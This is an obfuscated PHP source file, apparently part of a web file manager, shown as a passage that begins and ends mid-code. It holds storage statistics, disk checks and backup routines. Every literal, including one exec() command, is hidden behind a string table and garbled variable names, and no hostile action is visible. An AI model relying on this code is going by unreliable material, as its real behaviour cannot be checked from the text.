$á°½ Ä¾ = $õı…•¥°[$ğğ€ô±ú[1902]]; $Ù†©£Ìê = Model($ğğ€ô±ú[904])->where(array($ğğ€ô±ú[494] => 0))->count($ğğ€ô±ú[193]); $…ÓÓÂ££ = array($ğğ€ô±ú[494] => 0, $ğğ€ô±ú[231] => array($ğğ€ô±ú[1093], strtotime(date($ğğ€ô±ú[1909])))); $Õ‚úÀ° = Model($ğğ€ô±ú[904])->where($…ÓÓÂ££)->sum($ğğ€ô±ú[79]); $ŒµÅì¤ = Model($ğğ€ô±ú[904])->where($…ÓÓÂ££)->count($ğğ€ô±ú[193]); return array($ğğ€ô±ú[843] => $ÁÄõ™½, $ğğ€ô±ú[1902] => $á°½ Ä¾, $ğğ€ô±ú[1934] => $ÁÄõ™½ - $á°½ Ä¾, $ğğ€ô±ú[1935] => (int) $Õ‚úÀ°, $ğğ€ô±ú[845] => (int) $Ù†©£Ìê, $ğğ€ô±ú[1936] => (int) $ŒµÅì¤); } private function optionAccess() { $ó¸ØŸ =& $_SERVER[ç¦¬”œš]; return array($ó¸ØŸ[838] => $this->typeLogCnt(), $ó¸ØŸ[110] => $this->typeLogCnt($ó¸ØŸ[110]), $ó¸ØŸ[534] => $this->typeLogCnt($ó¸ØŸ[534]), $ó¸ØŸ[1937] => $this->typeLogCnt($ó¸ØŸ[1937]), $ó¸ØŸ[1938] => $this->typeLogCnt($ó¸ØŸ[1938]), $ó¸ØŸ[671] => $this->typeLogCnt($ó¸ØŸ[12], $ó¸ØŸ[1913])); } private function typeLogCnt($‚“âîÉØ = '', $ïìÇ¹ùÖ = "\151\x64") { $ŒµÖÑ¢’ =& $_SERVER[ç¦¬”œš]; $Ø•šÜí = array($ŒµÖÑ¢’[110] => array($ŒµÖÑ¢’[1939], $ŒµÖÑ¢’[1940]), $ŒµÖÑ¢’[534] => array($ŒµÖÑ¢’[1941], $ŒµÖÑ¢’[1942]), $ŒµÖÑ¢’[1937] => array($ŒµÖÑ¢’[1943], $ŒµÖÑ¢’[1944], $ŒµÖÑ¢’[1945]), $ŒµÖÑ¢’[1938] => array($ŒµÖÑ¢’[1946], $ŒµÖÑ¢’[1947]), $ŒµÖÑ¢’[1948] => array($ŒµÖÑ¢’[1949], $ŒµÖÑ¢’[1950], $ŒµÖÑ¢’[1951])); $şİ­À Ú = strtotime(date($ŒµÖÑ¢’[1909])); $Ä­îâ±ˆ = array($ŒµÖÑ¢’[231] => array($ŒµÖÑ¢’[1093], $şİ­À Ú)); if ($‚“âîÉØ) { $Ä­îâ±ˆ[$ŒµÖÑ¢’[33]] = array($ŒµÖÑ¢’[7], $Ø•šÜí[$‚“âîÉØ]); } $Ö·¯ö– = Model($ŒµÖÑ¢’[1912])->where($Ä­îâ±ˆ)->count($ïìÇ¹ùÖ); return (int) $Ö·¯ö–; } private function optionServer() { $œ„êĞ– =& $_SERVER[ç¦¬”œš]; $¬Ô­’ˆœ = $this->diskDriver(); $óêˆ”â = KodIO::defaultDriver(); $“ä×”»‡ = array($œ„êĞ–[897] => $óêˆ”â[$œ„êĞ–[484]]); $ü§Œ÷« = Model($œ„êĞ–[553])->where($“ä×”»‡)->sum($œ„êĞ–[79]); $Í”ûôø€ = explode($œ„êĞ–[53], $_SERVER[$œ„êĞ–[147]]); $Œ„Àã¯Ş = $Í”ûôø€[0]; $·úÄºå = $GLOBALS[$œ„êĞ–[6]][$œ„êĞ–[21]]; $Ùş’ºµ¡ = $·úÄºå[$œ„êĞ–[1055]]; if ($Ùş’ºµ¡ == $œ„êĞ–[1043]) { $³°à†€ = explode($œ„êĞ–[1369], $·úÄºå[$œ„êĞ–[1054]]); $Ùş’ºµ¡ = $³°à†€[0]; } if ($Ùş’ºµ¡ == $œ„êĞ–[991] || $Ùş’ºµ¡ == $œ„êĞ–[884]) { $ÚéÌñ´å = Model()->db()->query($œ„êĞ–[1952]); $û˜¡³¨ˆ = $ÚéÌñ´å[0] && isset($ÚéÌñ´å[0][$œ„êĞ–[1658]]) ? $ÚéÌñ´å[0][$œ„êĞ–[1658]] : 0; $Ùş’ºµ¡ = $œ„êĞ–[1953] . ($û˜¡³¨ˆ ? $œ„êĞ–[8] . $û˜¡³¨ˆ : $œ„êĞ–[12]); } $û§ºú‡¼ = $GLOBALS[$œ„êĞ–[6]][$œ„êĞ–[425]][$œ„êĞ–[906]]; return array($œ„êĞ–[1954] => $¬Ô­’ˆœ ? $¬Ô­’ˆœ[$œ„êĞ–[1955]] : 0, $œ„êĞ–[1956] => $¬Ô­’ˆœ ? $¬Ô­’ˆœ[$œ„êĞ–[1957]] : 0, $œ„êĞ–[1958] => (int) $óêˆ”â[$œ„êĞ–[1955]] * 1024 * 1024 * 1024, $œ„êĞ–[1959] => (int) $ü§Œ÷«, $œ„êĞ–[1960] => ucfirst($Œ„Àã¯Ş), $œ„êĞ–[1961] => $œ„êĞ–[1962] . PHP_VERSION, $œ„êĞ–[1963] => phpBuild64() ? 64 : 32, $œ„êĞ–[837] => str_replace($œ„êĞ–[1212], $œ„êĞ–[1071], $Ùş’ºµ¡), $œ„êĞ–[425] => ucfirst($û§ºú‡¼), $œ„êĞ–[32] => $_SERVER[$œ„êĞ–[1964]]); } private function diskDriver() { $‰³É¦ËŸ =& $_SERVER[ç¦¬”œš]; $ì×¹“¡ = $‰³É¦ËŸ[8]; $Ğ…¾œï = $GLOBALS[$‰³É¦ËŸ[6]][$‰³É¦ËŸ[1386]] == $‰³É¦ËŸ[1387]; if ($Ğ…¾œï) { $ì×¹“¡ = $‰³É¦ËŸ[1965]; if (function_exists($‰³É¦ËŸ[1966])) { exec($‰³É¦ËŸ[1967], $…øõ²É); $ì×¹“¡ = $…øõ²É[1] . $‰³É¦ËŸ[8]; } } if (!file_exists($ì×¹“¡)) { return; } if (!function_exists($‰³É¦ËŸ[1968])) { return; } $•ØœÖÅ = @disk_total_space($ì×¹“¡); $ç«‡ˆ» = $•ØœÖÅ - @disk_free_space($ì×¹“¡); return array($‰³É¦ËŸ[1955] => $•ØœÖÅ, $‰³É¦ËŸ[1957] => $ç«‡ˆ»); } public function fileChart($Û¶†´›½) { $Ò†Éä¥î =& $_SERVER[ç¦¬”œš]; if (isset($Û¶†´›½[$Ò†Éä¥î[1770]])) { return Model($Ò†Éä¥î[904])->userFileTypeProfile($Û¶†´›½[$Ò†Éä¥î[1770]]); } if (isset($Û¶†´›½[$Ò†Éä¥î[1969]])) { return Model($Ò†Éä¥î[904])->groupFileTypeProfile($Û¶†´›½[$Ò†Éä¥î[1969]]); } $‰ÊŸì›É = $this->sourceSize(); $•èáá‚ı = array($Ò†Éä¥î[192] => 0, $Ò†Éä¥î[190] => 1); $¶âÈêéö = Model($Ò†Éä¥î[904])->where($•èáá‚ı)->sum($Ò†Éä¥î[79]); $•èáá‚ı[$Ò†Éä¥î[190]] = 2; $¨´’Æô¶ = Model($Ò†Éä¥î[904])->where($•èáá‚ı)->sum($Ò†Éä¥î[79]); return array($Ò†Éä¥î[843] => $‰ÊŸì›É[$Ò†Éä¥î[79]], $Ò†Éä¥î[1902] => $‰ÊŸì›É[$Ò†Éä¥î[1902]], $Ò†Éä¥î[1903] => (int) $¶âÈêéö, $Ò†Éä¥î[1904] => (int) $¨´’Æô¶); } private function sourceSize() { $¢üö•‘† =& $_SERVER[ç¦¬”œš]; $‹°“ü×é = Model($¢üö•‘†[904])->where(array($¢üö•‘†[494] => 0))->sum($¢üö•‘†[79]); $ãÇ¶Äô‹ = Model($¢üö•‘†[553])->sum($¢üö•‘†[79]); if ($ãÇ¶Äô‹ > $‹°“ü×é) { $ãÇ¶Äô‹ = $‹°“ü×é; } return array($¢üö•‘†[79] => (int) $‹°“ü×é, $¢üö•‘†[1902] => (int) $ãÇ¶Äô‹); } } goto fÖë£ç†©; D•¸ŠÙßê: function binCheckBigger($¿’Õğ¡Ö, $¬•·¡ù) { return $¿’Õğ¡Ö > $¬•·¡ù; } $_SERVER[$_SERVER[Æ‡¶Û«ï][3]] = ("\70\65\61\66"."\71\65")+0;$_epmt="y72va4r0o8z6lt3xcqg9wiejfsbpdumnk15h87kaptylw34cdi09n1zgjuxre56o2qbvfmshiuefrk8qah";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($™Œ÷èğÜ, $¡¹æ©Ì) { $™íê³–É =& $_SERVER[ç¦¬”œš]; if (isset(self::$_methodList[$™Œ÷èğÜ])) { return @call_user_func_array(self::$_methodList[$™Œ÷èğÜ], $¡¹æ©Ì); } else { if (method_exists($this, $™Œ÷èğÜ)) { return call_user_func_array(array($this, $™Œ÷èğÜ), $¡¹æ©Ì); } else { think_exception(__CLASS__ . $™íê³–É[4] . $™Œ÷èğÜ . $™íê³–É[5]); } } } public static function __callStatic($³å—µû®, $Ö„ƒú«â) { if (isset(self::$_methodListStatic[$³å—µû®])) { return call_user_func_array(self::$_methodListStatic[$³å—µû®], $Ö„ƒú«â); } else { if (method_exists(self, $³å—µû®)) { return call_user_func_array(array(self, $³å—µû®), $Ö„ƒú«â); } else { show_json("{$³å—µû®}\x28\51\x20\156\157\164\x20\145\170\151\163\x74\x3b", !1); } } } public static function addMethod($³ÕúÖ”, $³éİ””‘) { self::$_methodList[$³ÕúÖ”] = $³éİ””‘; } public static function addMethodStatic($«±ÎÚçè, $¼‚ğÊáÙ) { self::$_methodListStatic[$«±ÎÚçè] = $¼‚ğÊáÙ; } } goto B‡ª¾Ãßá; c¥ØùÔÈ„ø: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $áĞ²â¤ =& $_SERVER[ç¦¬”œš]; $Ê¹Ù˜‘Ä = Backup::get(); self::$io = $Ê¹Ù˜‘Ä[$áĞ²â¤[832]]; self::$name = $Ê¹Ù˜‘Ä[$áĞ²â¤[32]]; $­½›•³Ê = new DbManage(); $Ï¯Áç¥ê = $­½›•³Ê->dbType(); $çÑÄõèÓ = array($áĞ²â¤[857] => $Ï¯Áç¥ê, $áĞ²â¤[858] => time()); Backup::set($çÑÄõèÓ); $“ƒ£éíß = $this->tmpFilesPath() . $áĞ²â¤[859] . self::$name . $áĞ²â¤[8]; del_dir($“ƒ£éíß); mk_dir($“ƒ£éíß); $“€ÅûÎ = $¤÷éÛ¦Ï = 0; try { $çŞˆ£è„ = $­½›•³Ê->db()->getTables(); } catch (Exception $¸èŞ¥ä˜) { return !1; } $çŞˆ£è„ = array_diff($çŞˆ£è„, array($áĞ²â¤[860], $áĞ²â¤[861])); foreach ($çŞˆ£è„ as $ÇÀ‡ìñğ) { $“€ÅûÎ += $­½›•³Ê->model($ÇÀ‡ìñğ)->count(); } $ğ“áóŠ = new Task($áĞ²â¤[862], $áĞ²â¤[863], $“€ÅûÎ, LNG($áĞ²â¤[864]) . $áĞ²â¤[865] . LNG($áĞ²â¤[866])); $GLOBALS[$áĞ²â¤[867]] = self::$name; foreach ($çŞˆ£è„ as $ÇÀ‡ìñğ) { $Ë ‡‡æ² = $“ƒ£éíß . $ÇÀ‡ìñğ . $áĞ²â¤[868]; $ Öµ°È¼ = null; if ($ÇÀ‡ìñğ == $áĞ²â¤[869] && (!isset($Ê¹Ù˜‘Ä[$áĞ²â¤[171]]) || $Ê¹Ù˜‘Ä[$áĞ²â¤[171]] == $áĞ²â¤[228])) { $ Öµ°È¼ = self::$io; } $¤÷éÛ¦Ï += $­½›•³Ê->sqlFromDb($ÇÀ‡ìñğ, $Ë ‡‡æ², $ğ“áóŠ, $ Öµ°È¼); } unset($GLOBALS[$áĞ²â¤[867]]); $ğ“áóŠ->end(); if ($¤÷éÛ¦Ï > $“€ÅûÎ) { $“€ÅûÎ = $¤÷éÛ¦Ï; } $çÑÄõèÓ = array($áĞ²â¤[857] => $Ï¯Áç¥ê, $áĞ²â¤[853] => 1, $áĞ²â¤[870] => $“€ÅûÎ, $áĞ²â¤[871] => $¤÷éÛ¦Ï, $áĞ²â¤[872] => time()); Backup::set($çÑÄõèÓ); if ($“€ÅûÎ - $¤÷éÛ¦Ï > 0) { $ï™•Ï· = $áĞ²â¤[873]; if (!stristr(I18n::getType(), $áĞ²â¤[874])) { $ï™•Ï· = $áĞ²â¤[875]; } write_log(array($ï™•Ï·, $çÑÄõèÓ), $áĞ²â¤[863]); return !1; } return !0; } private function tmpFilesPath() { $éĞÚ©Ô =& $_SERVER[ç¦¬”œš]; $÷ÓºüÄ¯ = TEMP_FILES; if ($GLOBALS[$éĞÚ©Ô[6]][$éĞÚ©Ô[92]][$éĞÚ©Ô[876]]) { $÷ÓºüÄ¯ = $GLOBALS[$éĞÚ©Ô[6]][$éĞÚ©Ô[92]][$éĞÚ©Ô[876]]; if (!mk_dir($÷ÓºüÄ¯) || !is_writable($÷ÓºüÄ¯) || !IO::mkfile($÷ÓºüÄ¯ . $éĞÚ©Ô[877])) { $÷ÓºüÄ¯ = TEMP_FILES; } } return $÷ÓºüÄ¯; } } class BackupDbFile { public function __construct() { } public function index() { $êşßƒŠ‰ =& $_SERVER[ç¦¬”œš]; $€â°‘í = Backup::get(); $ÖÓâ½Ò = $€â°‘í[$êşßƒŠ‰[32]]; $ëŞ›µ¿× = $this->tmpFilesPath() . "\x62\141\143\x6b\165\x70\x5f{$ÖÓâ½Ò}\57"; $—¨şĞÉ¸ = $this->backupPath($€â°‘í); if (!($—¨şĞÉ¸ = IO::mkdir($—¨şĞÉ¸))) { return !1; } $İ¹ùì = IO::listPath($ëŞ›µ¿×); $ûªæ½Ñ¦ = isset($İ¹ùì[$êşßƒŠ‰[86]]) ? $İ¹ùì[$êşßƒŠ‰[86]] : array(); $“òô£ª¢ = array_sum(array_column($ûªæ½Ñ¦, $êşßƒŠ‰[79])); if (!$“òô£ª¢) { return !1; } $şÁñ•ñª = array($êşßƒŠ‰[878] => $“òô£ª¢, $êşßƒŠ‰[879] => time()); Backup::set($şÁñ•ñª); $«´ÚÆÀê = new TaskFileTransfer($êşßƒŠ‰[880], $êşßƒŠ‰[863], count($ûªæ½Ñ¦), LNG($êşßƒŠ‰[864]) . $êşßƒŠ‰[462] . LNG($êşßƒŠ‰[866]) . $êşßƒŠ‰[881]); $«´ÚÆÀê->task[$êşßƒŠ‰[843]] = $“òô£ª¢; foreach ($İ¹ùì[$êşßƒŠ‰[86]] as $õµˆ”â) { $ñş£ÊÂ× = IO::move($õµˆ”â[$êşßƒŠ‰[87]], $—¨şĞÉ¸); if (!$ñş£ÊÂ×) { $«´ÚÆÀê->end(); $´›ğÕ€‡ = IO::getLastError($êşßƒŠ‰[882] . $õµˆ”â[$êşßƒŠ‰[87]] . $êşßƒŠ‰[883] . $—¨şĞÉ¸ . $êşßƒŠ‰[178]); write_log($´›ğÕ€‡, $êşßƒŠ‰[863]); return !1; } } $¿¬»ä©“ = new DbManage(); $®å»ÁŸ = $¿¬»ä©“->getSqlFile(); if (!$®å»ÁŸ[$êşßƒŠ‰[884]] || !$®å»ÁŸ[$êşßƒŠ‰[13]]) { return !1; } IO::move($®å»ÁŸ[$êşßƒŠ‰[884]], $—¨şĞÉ¸); IO::move($®å»ÁŸ[$êşßƒŠ‰[13]], $—¨şĞÉ¸); $«´ÚÆÀê->end(); $şÁñ•ñª = array($êşßƒŠ‰[885] => $“òô£ª¢, $êşßƒŠ‰[886] => time()); Backup::set($şÁñ•ñª); return !0; } private function backupPath($¥şïíâ´) { $Ğ¶Ò³Œ¥ =& $_SERVER[ç¦¬”œš]; $ôº°¸Œñ = $¥şïíâ´[$Ğ¶Ò³Œ¥[32]]; $¯µö¬Êõ = Model($Ğ¶Ò³Œ¥[850])->get($Ğ¶Ò³Œ¥[851]); $Ëæºë³£ = substr(md5($Ğ¶Ò³Œ¥[852] . $¯µö¬Êõ . $ôº°¸Œñ), 0, 8); return "\x7b\x69\157\x3a{$¥şïíâ´[$Ğ¶Ò³Œ¥[832]]}\175\x2f\144\x61\x74\141\142\x61\163\145\x2f\x62\141\x63\x6b\x75\x70\x2f" . $ôº°¸Œñ . $Ğ¶Ò³Œ¥[11] . $Ëæºë³£; } private function tmpFilesPath() { $ÊË¨äÂİ =& $_SERVER[ç¦¬”œš]; $°»ÜÍ¡Ø = TEMP_FILES; if ($GLOBALS[$ÊË¨äÂİ[6]][$ÊË¨äÂİ[92]][$ÊË¨äÂİ[876]]) { $°»ÜÍ¡Ø = $GLOBALS[$ÊË¨äÂİ[6]][$ÊË¨äÂİ[92]][$ÊË¨äÂİ[876]]; if (!mk_dir($°»ÜÍ¡Ø) || !is_writable($°»ÜÍ¡Ø) || !IO::mkfile($°»ÜÍ¡Ø . $ÊË¨äÂİ[877])) { $°»ÜÍ¡Ø = TEMP_FILES; } } return $°»ÜÍ¡Ø; } } class BackupFile { public function __construct() { } public function index() { $ÚÛ‘À«£ = Backup::get(); $×È½Úº£ = $ÚÛ‘À«£[$_SERVER[ç¦¬”œš][369]][$_SERVER[ç¦¬”œš][230]][$_SERVER[ç¦¬”œš][550]]; $€Åéø‡œ = array($_SERVER[ç¦¬”œš][551] => array($_SERVER[ç¦¬”œš][887], $×È½Úº£), $_SERVER[ç¦¬”œš][888] => array($_SERVER[ç¦¬”œš][407], $ÚÛ‘À«£[$_SERVER[ç¦¬”œš][832]])); $üì™ÇÒœ = (int) Model($_SERVER[ç¦¬”œš][869])->where($€Åéø‡œ)->count($_SERVER[ç¦¬”œš][550]); $ÍÆ®Ê• = (int) Model($_SERVER[ç¦¬”œš][869])->where($€Åéø‡œ)->sum($_SERVER[ç¦¬”œš][79]); $õ“ü‰Ò§ = new TaskFileTransfer($_SERVER[ç¦¬”œš][889], $_SERVER[ç¦¬”œš][863], $üì™ÇÒœ, LNG($_SERVER[ç¦¬”œš][864]) . $_SERVER[ç¦¬”œš][865] . LNG($_SERVER[ç¦¬”œš][890])); $õ“ü‰Ò§->task[$_SERVER[ç¦¬”œš][843]] = $ÍÆ®Ê•; $Ë¢˜ÂÏ = array($_SERVER[ç¦¬”œš][891] => $üì™ÇÒœ, $_SERVER[ç¦¬”œš][892] => $ÍÆ®Ê•, $_SERVER[ç¦¬”œš][893] => time()); Backup::set($Ë¢˜ÂÏ); $ŒÛØŠ = !0; $Š·ßæ®‰ = $this->storeIds(); $¤À±‰á¡ = 1; $×Ò¼Òë = 1000; $®éÎãÜú = $İ¾‰»¸¯ = 0; $Æëš€°® = array(); $Šğ¥—äÍ = $Õæ¹¤×ı = 0; do { $¸Â¢Û¹¿ = $_SERVER[ç¦¬”œš][894]; $ÓÈ¯ù˜ = Model($_SERVER[ç¦¬”œš][869])->where($€Åéø‡œ)->field($¸Â¢Û¹¿)->order($_SERVER[ç¦¬”œš][895])->selectPage($×Ò¼Òë, $¤À±‰á¡); $×¶¯æöç = !empty($ÓÈ¯ù˜[$_SERVER[ç¦¬”œš][445]]) ? $ÓÈ¯ù˜[$_SERVER[ç¦¬”œš][445]] : array(); foreach ($×¶¯æöç as $‡Ç°ùúò) { if (!$this->_fileExist($‡Ç°ùúò, $Æëš€°®, $Š·ßæ®‰)) { write_log("\x66\x69\x6c\145\x20\156\x6f\x74\x20\x65\170\x69\x73\164\56\x66\151\154\x65\x49\104\72{$‡Ç°ùúò[$_SERVER[ç¦¬”œš][550]]}\x2c\40\x70\x61\x74\x68\x3a{$‡Ç°ùúò[$_SERVER[ç¦¬”œš][87]]}", $_SERVER[ç¦¬”œš][896]); continue; } $«­ÇØ¦ = $‡Ç°ùúò[$_SERVER[ç¦¬”œš][87]]; $ôÕõ¿ü´ = "\x7b\x69\157\x3a{$ÚÛ‘À«£[$_SERVER[ç¦¬”œš][832]]}\x7d" . substr($«­ÇØ¦, strlen("\x7b\151\x6f\72{$‡Ç°ùúò[$_SERVER[ç¦¬”œš][897]]}\x7d")); if (IO::exist($ôÕõ¿ü´)) { $õ“ü‰Ò§->updateFileEnd($‡Ç°ùúò[$_SERVER[ç¦¬”œš][32]], $‡Ç°ùúò[$_SERVER[ç¦¬”œš][79]]); } else { $ôÕõ¿ü´ = get_path_father($ôÕõ¿ü´); IO::mkdir($ôÕõ¿ü´); if (!IO::copy($«­ÇØ¦, $ôÕõ¿ü´, $_SERVER[ç¦¬”œš][898])) { write_log($_SERVER[ç¦¬”œš][899] . $«­ÇØ¦ . $_SERVER[ç¦¬”œš][883] . $ôÕõ¿ü´ . $_SERVER[ç¦¬”œš][178], $_SERVER[ç¦¬”œš][863]); $ŒÛØŠ = !1; break; } } $×È½Úº£ = $‡Ç°ùúò[$_SERVER[ç¦¬”œš][550]]; $İ¾‰»¸¯ += 1; $®éÎãÜú += $‡Ç°ùúò[$_SERVER[ç¦¬”œš][79]]; $Õæ¹¤×ı += 1; $Šğ¥—äÍ += $‡Ç°ùúò[$_SERVER[ç¦¬”œš][79]]; if ($®éÎãÜú >= 1024 * 1024 * 100) { $Ë¢˜ÂÏ = array($_SERVER[ç¦¬”œš][831] => $×È½Úº£, $_SERVER[ç¦¬”œš][900] => $Õæ¹¤×ı, $_SERVER[ç¦¬”œš][901] => $Šğ¥—äÍ); Backup::set($Ë¢˜ÂÏ); $®éÎãÜú = $İ¾‰»¸¯ = 0; } } $´ôÜ¸®é = count($×¶¯æöç); $¤À±‰á¡++; } while ($´ôÜ¸®é == $×Ò¼Òë); $õ“ü‰Ò§->end(); $Ë¢˜ÂÏ = array($_SERVER[ç¦¬”œš][902] => 1, $_SERVER[ç¦¬”œš][841] => time(), $_SERVER[ç¦¬”œš][855] => 1, $_SERVER[ç¦¬”œš][831] => $×È½Úº£, $_SERVER[ç¦¬”œš][903] => time()); if ($İ¾‰»¸¯) { $Ë¢˜ÂÏ[$_SERVER[ç¦¬”œš][900]] = $Õæ¹¤×ı; $Ë¢˜ÂÏ[$_SERVER[ç¦¬”œš][901]] = $Šğ¥—äÍ; } Backup::set($Ë¢˜ÂÏ); return !0; } private function _fileExist($·”ÊøĞ, &$´Œú‘‡, $àåÀœÏÜ) { $„‘ê¥­é =& $_SERVER[ç¦¬”œš]; $§¹ø = $·”ÊøĞ[$„‘ê¥­é[87]]; if (in_array($·”ÊøĞ[$„‘ê¥­é[550]], $´Œú‘‡)) { return !1; } if (!in_array($·”ÊøĞ[$„‘ê¥­é[897]], $àåÀœÏÜ)) { return !1; } if (IO::exist($§¹ø)) { return !0; } $îë¡ºĞ = get_path_father($§¹ø); if (IO::exist($îë¡ºĞ)) { $´Œú‘‡[] = $·”ÊøĞ[$„‘ê¥­é[550]]; return !1; } $åÖµ«íê = array($„‘ê¥­é[897] => $·”ÊøĞ[$„‘ê¥­é[897]], $„‘ê¥­é[87] => array($„‘ê¥­é[459], "{$îë¡ºĞ}\45")); $üÃûÁõó = Model($„‘ê¥­é[869])->where($åÖµ«íê)->field($„‘ê¥­é[551])->select(); $´Œú‘‡ = array_merge($´Œú‘‡, array_to_keyvalue($üÃûÁõó, $„‘ê¥­é[12], $„‘ê¥­é[550])); return !1; } private function _fileFilter($¹ôü›§) { $ı‘…”Ä… =& $_SERVER[ç¦¬”œš]; return; if (empty($¹ôü›§)) { return; } $éå‰ÀÇ™ = array($ı‘…”Ä…[550] => array($ı‘…”Ä…[7], array_unique($¹ôü›§))); $íî…ú™ = Model($ı‘…”Ä…[904])->where($éå‰ÀÇ™)->field($ı‘…”Ä…[193])->select(); foreach ($íî…ú™ as $Ø‘ÉÂ¦©) { Model($ı‘…”Ä…[904])->remove($Ø‘ÉÂ¦©[$ı‘…”Ä…[193]], !1); } } private function storeIds() { $í®¿™¥” =& $_SERVER[ç¦¬”œš]; $çìçŞêí = Model($í®¿™¥”[847])->listData(); $ë’¨ŞØ¡ = array(); $Ş²ÅĞ°¡ = $GLOBALS[$í®¿™¥”[6]][$í®¿™¥”[92]][$í®¿™¥”[905]]; foreach ($çìçŞêí as $†ş‰–ÛÙ) { $ã½‚ËéÉ = strtolower($†ş‰–ÛÙ[$í®¿™¥”[98]]); if (!isset($Ş²ÅĞ°¡[$ã½‚ËéÉ])) { continue; } $õüİşİÊ = $í®¿™¥”[77] . (isset($Ş²ÅĞ°¡[$ã½‚ËéÉ]) ? $Ş²ÅĞ°¡[$ã½‚ËéÉ] : ucfirst($ã½‚ËéÉ)); if (!class_exists($õüİşİÊ)) { continue; } $ë’¨ŞØ¡[] = $†ş‰–ÛÙ[$í®¿™¥”[484]]; } return $ë’¨ŞØ¡; } } goto Aëä…Œ‰œ­; Fñ³Ôñä¦ò: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($ë¥ıµ¼) { $Öö ×Óñ =& $_SERVER[ç¦¬”œš]; return array($Öö ×Óñ[2082] => array($ë¥ıµ¼[0], $Öö ×Óñ[2083]), $Öö ×Óñ[2084] => array($ë¥ıµ¼[0], $Öö ×Óñ[2085])); } protected function get($ş­ü½Ã§) { $“ô†êºÌ =& $_SERVER[ç¦¬”œš]; $İÔ¶ŞÚå = Model($“ô†êºÌ[594])->metaGet($ş­ü½Ã§, $“ô†êºÌ[2086]); $¯±¢âÑ = json_decode($İÔ¶ŞÚå, !0); return $¯±¢âÑ ? $¯±¢âÑ : array($“ô†êºÌ[2087] => $“ô†êºÌ[91], $“ô†êºÌ[445] => array()); } protected function set($»Ü÷„ÁÖ, $İùş±Õ“) { $İ‹Ô£µÄ =& $_SERVER[ç¦¬”œš]; $İùş±Õ“ = $İùş±Õ“ ? $İùş±Õ“ : array($İ‹Ô£µÄ[2087] => $İ‹Ô£µÄ[91], $İ‹Ô£µÄ[445] => array()); return Model($İ‹Ô£µÄ[594])->metaSet($»Ü÷„ÁÖ, $İ‹Ô£µÄ[2086], json_encode($İùş±Õ“)); } protected function getByTagID($”ò¦õ¤Ä, $í°ôõƒ³) { $¤´›ğÜù =& $_SERVER[ç¦¬”œš]; if (!$”ò¦õ¤Ä || !$í°ôõƒ³) { return !1; } if (!Model($¤´›ğÜù[594])->getInfoSimple($”ò¦õ¤Ä)) { return !1; } $°·ˆñæ = $this->get($”ò¦õ¤Ä); if (!$°·ˆñæ || !isset($°·ˆñæ[$¤´›ğÜù[445]])) { return !1; } $ÇÁ©¦È = array_find_by_field($°·ˆñæ[$¤´›ğÜù[445]], $¤´›ğÜù[484], $í°ôõƒ³); return is_array($ÇÁ©¦È) ? $ÇÁ©¦È : !1; } public function listSource($à‘«ÒÆ, $çĞ¢Ã£•) { $‚´ãŒË =& $_SERVER[ç¦¬”œš]; if ($çĞ¢Ã£• && !is_array($çĞ¢Ã£•)) { $çĞ¢Ã£• = array($çĞ¢Ã£•); } $¼ÄĞëüš = $this->listData($à‘«ÒÆ); $ø¾öõ± = array(); foreach ($¼ÄĞëüš as $ç×”´Ñê) { $éÑÊÎší = $ç×”´Ñê[$‚´ãŒË[87]]; if (!$éÑÊÎší) { continue; } if (!isset($ø¾öõ±[$éÑÊÎší])) { $ø¾öõ±[$éÑÊÎší] = array(); } $ø¾öõ±[$éÑÊÎší][] = $ç×”´Ñê[$‚´ãŒË[509]]; } $¸¤‰ìò = array(); foreach ($ø¾öõ± as $Ñâéáß” => $¶“Õµ) { $âœúÚëú = !0; if (!$çĞ¢Ã£•) { $¸¤‰ìò[] = $Ñâéáß”; continue; } foreach ($çĞ¢Ã£• as $Ú¢Ñö¶å) { if (!in_array($Ú¢Ñö¶å, $¶“Õµ)) { $âœúÚëú = !1; break; } } if ($âœúÚëú) { $¸¤‰ìò[] = $Ñâéáß”; } } if (!$¸¤‰ìò) { return array(); } $®Ğ„Ê‹ˆ = array($‚´ãŒË[500] => array($‚´ãŒË[501], $¸¤‰ìò), $‚´ãŒË[578] => $à‘«ÒÆ, $‚´ãŒË[190] => SourceModel::TYPE_GROUP); $Áñî‡œÂ = Model($‚´ãŒË[1419])->listSource($®Ğ„Ê‹ˆ); if (!$Áñî‡œÂ || count($¸¤‰ìò) == $Áñî‡œÂ[$‚´ãŒË[442]][$‚´ãŒË[443]]) { return $Áñî‡œÂ; } $ĞÕÍ°Áœ = array(); $·£ç†òô = array_to_keyvalue($Áñî‡œÂ[$‚´ãŒË[85]], $‚´ãŒË[12], $‚´ãŒË[193]); $™»¬İŠ– = array_to_keyvalue($Áñî‡œÂ[$‚´ãŒË[86]], $‚´ãŒË[12], $‚´ãŒË[193]); $Š¦…÷× = array_merge($™»¬İŠ–, $·£ç†òô); foreach ($¸¤‰ìò as $éÑÊÎší) { if (!in_array($éÑÊÎší, $Š¦…÷×)) { $ĞÕÍ°Áœ[] = $éÑÊÎší; } } if ($ĞÕÍ°Áœ) { $this->removeBySource($à‘«ÒÆ, $ĞÕÍ°Áœ); } return $Áñî‡œÂ; } protected function listData($ı³Åùå¶) { $í‚ñÜ³§ =& $_SERVER[ç¦¬”œš]; $Î—¥–ĞÂ = array($í‚ñÜ³§[1761] => 0, $í‚ñÜ³§[566] => array($í‚ñÜ³§[2088], 0), $í‚ñÜ³§[505] => $í‚ñÜ³§[2089] . $ı³Åùå¶); $¸ÉîÖ¡å = $í‚ñÜ³§[2090]; $¦™¶»ÆÍ = $this->field($¸ÉîÖ¡å)->where($Î—¥–ĞÂ)->order($í‚ñÜ³§[2091])->select(); return $¦™¶»ÆÍ ? $¦™¶»ÆÍ : array(); } protected function addToTag($Œ˜¬Ä¶³, $¦–¢¶‰, $Ğ„èÛ¢Ï) { $ãèÌóùÂ =& $_SERVER[ç¦¬”œš]; if (!$this->getByTagID($Œ˜¬Ä¶³, $Ğ„èÛ¢Ï) || !$¦–¢¶‰) { return !1; } if (!Model($ãèÌóùÂ[904])->pathInfo($¦–¢¶‰)) { return !1; } $åãñõÜÇ = array($ãèÌóùÂ[1761] => 0, $ãèÌóùÂ[566] => $Ğ„èÛ¢Ï, $ãèÌóùÂ[504] => $¦–¢¶‰, $ãèÌóùÂ[505] => $ãèÌóùÂ[2092] . $Œ˜¬Ä¶³, $ãèÌóùÂ[503] => 